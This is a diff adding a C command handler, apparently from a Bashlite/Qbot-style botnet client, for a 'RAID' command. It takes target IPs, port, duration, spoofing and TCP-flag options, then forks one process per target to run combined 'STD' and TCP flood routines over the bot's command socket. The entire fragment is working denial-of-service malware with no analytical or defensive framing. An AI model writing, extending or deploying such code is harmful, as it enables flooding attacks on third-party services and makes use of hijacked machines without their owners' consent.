@@ -1,0 +1,35 @@
+        if(!strcmp(argv[0], "RAID"))
+        {
+        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
+        {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        int spoofed = atoi(argv[4]);
+        unsigned char *flags = argv[5];
+                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
+        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
+        if(strstr(ip, ",") != NULL)
+        {
+            unsigned char *ip = strtok(ip, ",");
+            while(ip != NULL)
+            {
+                                if(!listFork())
+                                {
+                                        astd(ip, port, time);
+                                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                                        close(mainCommSock);
+                                        _exit(0);
+                                }
+                                ip = strtok(NULL, ",");
+                        }
+                } else { 
+                        if (listFork()) { return; }
+                        astd(ip, port, time);
+                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                        close(mainCommSock);
+                        _exit(0);
+                }
+        }    
